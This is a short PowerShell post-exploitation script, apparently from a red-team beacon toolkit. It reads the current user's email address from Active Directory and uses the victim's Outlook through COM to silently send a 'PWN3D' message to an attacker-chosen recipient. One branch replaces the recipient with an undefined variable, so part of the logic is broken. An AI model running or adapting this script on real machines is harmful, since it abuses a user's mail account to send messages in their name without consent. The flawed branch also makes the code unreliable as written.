param (
    [string]$Subject = "I HAZ BEEN PWN3D",
    [string]$Body = "I HAZ BEEN PWN3D BY CYSECURIT!",
	[string]$Recipient = ""
)
$userMail = ""
try {
	$userMail = ([adsi]"LDAP://$(whoami /fqdn)").mail
} catch {
	$userMail = ($env:USERNAME+"@email.com")
	if($Recipient) { $Recipient = $targetEmailAddress }
}
try {
		
	if( $userMail ) {
		$O = New-Object -ComObject Outlook.Application
		$M = $O.CreateItem(0)
		$M.Subject = $Subject
		$M.HTMLBody = $Body
		#$M.Recipients.Add($userMail)
		if( $Recipient ) { 
			$M.Recipients.Add($Recipient)
		}
		$M.Send()
	}
} catch {
	Write-Beacon -Message $_
}
